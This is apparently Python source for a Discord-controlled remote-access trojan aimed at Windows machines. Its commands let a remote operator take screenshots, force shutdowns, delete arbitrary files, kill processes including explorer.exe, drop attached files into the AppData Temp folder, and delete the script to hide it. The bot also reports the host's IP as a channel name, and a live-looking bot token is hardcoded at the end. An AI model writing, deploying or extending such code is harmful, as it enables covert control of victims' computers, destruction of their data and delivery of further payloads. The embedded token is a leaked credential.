from turtle import title
import discord
from discord.ext import commands
import os
import socket
import pyautogui
import time
import subprocess
import requests  # To handle downloading files

# Set up the bot
intents = discord.Intents.default()
intents.message_content = True
intents.members = True  # Allow bot to access members
bot = commands.Bot(command_prefix=".", intents=intents)

# Get the local IP of the user
def get_ip():
    hostname = socket.gethostname()
    ip_address = socket.gethostbyname(hostname)
    return ip_address

# Function to create a new channel with the IP address as the name
async def create_channel(ctx):
    ip = get_ip()
    guild = ctx.guild
    existing_channel = discord.utils.get(guild.channels, name=ip)
    
    if existing_channel is None:
        await guild.create_text_channel(ip)
        await ctx.send(f"Channel created for your IP: {ip}")
    else:
        await ctx.send(f"Channel already exists for your IP: {ip}")

# Function to take a screenshot
def take_screenshot():
    screenshot = pyautogui.screenshot()
    screenshot.save(f"screenshot_{time.time()}.png")
    return "Screenshot taken."

# Function to shut down the user's computer
def shutdown_computer():
    os.system("shutdown /s /f /t 0")
    return "System shutting down."

# Function to delete a file
def delete_file(file_path):
    if os.path.exists(file_path):
        os.remove(file_path)
        return f"File {file_path} deleted."
    else:
        return "File does not exist."

# Function to close a file
def close_file(file_name):
    try:
        os.system(f"taskkill /IM {file_name} /F")
        return f"{file_name} closed."
    except Exception as e:
        return f"Error closing {file_name}: {str(e)}"

# Function to cause a real blue screen (BSOD)
def bluescreen():
    # This is a dangerous operation and will crash the system. Only run with consent.
    # Initiating a system crash by forcing a critical stop (true BSOD)
    subprocess.run(["taskkill", "/IM", "explorer.exe", "/F"])  # Will kill the explorer process and cause instability
    return "System has crashed (BSOD simulated)."

# Function to disconnect and delete the bot's file
def disconnect_and_delete():
    try:
        bot_file = os.path.basename(__file__)  # Get the current script filename
        if os.path.exists(bot_file):
            os.remove(bot_file)
            return f"Bot file {bot_file} has been deleted."
        else:
            return "Bot file not found."
    except Exception as e:
        return f"Error deleting bot file: {str(e)}"

# Function to download an attachment file to Temp folder in AppData
async def download_attachment(message):
    try:
        if message.attachments:
            for attachment in message.attachments:
                # Save the file to the AppData Temp directory
                temp_dir = os.getenv('APPDATA') + r'\\Local\\Temp'  # Path to Temp folder in AppData
                file_name = attachment.filename
                file_path = os.path.join(temp_dir, file_name)
                file_url = attachment.url

                # Get the file content
                response = requests.get(file_url)

                if response.status_code == 200:
                    with open(file_path, 'wb') as file:
                        file.write(response.content)
                    return f"File {file_name} downloaded successfully to {file_path}."
                else:
                    return f"Failed to download the file: {file_name}."
        else:
            return "No attachments found in the message."
    except Exception as e:
        return f"Error downloading the attachment: {str(e)}"

# Command to create the channel with the user's IP
@bot.command(name='start')
async def start(ctx):
    await create_channel(ctx)

# Command to take a screenshot
@bot.command(name='ss')
async def screenshot(ctx):
    result = take_screenshot()
    await ctx.send(result)

# Command to shut down the user's computer
@bot.command(name='shutdown')
async def shutdown(ctx):
    result = shutdown_computer()
    await ctx.send(result)

# Command to delete a file (provide file path)
@bot.command(name='filedelete')
async def filedelete(ctx, file_path: str):
    result = delete_file(file_path)
    await ctx.send(result)

# Command to close a file (provide file name)
@bot.command(name='fileclose')
async def fileclose(ctx, file_name: str):
    result = close_file(file_name)
    await ctx.send(result)

# Command to trigger a blue screen (actual crash)
@bot.command(name='bluescreen')
async def simulate_bluescreen(ctx):
    result = bluescreen()
    await ctx.send(result)

# Command to disconnect and delete the bot file
@bot.command(name='disconnect')
async def disconnect(ctx):
    result = disconnect_and_delete()
    await ctx.send(result)

# Event when the bot is ready
@bot.event
async def on_ready():
    print(f'We have logged in as {bot.user}')

# Event when a message is received
@bot.event
async def on_message(message):
    if message.author == bot.user:
        return

    # Check for attachments and download them
    if message.content.startswith('.download'):
        result = await download_attachment(message)
        await message.channel.send(result)

    await bot.process_commands(message)

# Run the bot with your Discord token
bot.run('MTI0ODk1NjA2MDEyNzk4OTc5MQ.GzIGG8.QUPsdzAUj07ihPrmW_VrWSM5lKnEci5jUQ3poA')  # Replace with your Discord bot token

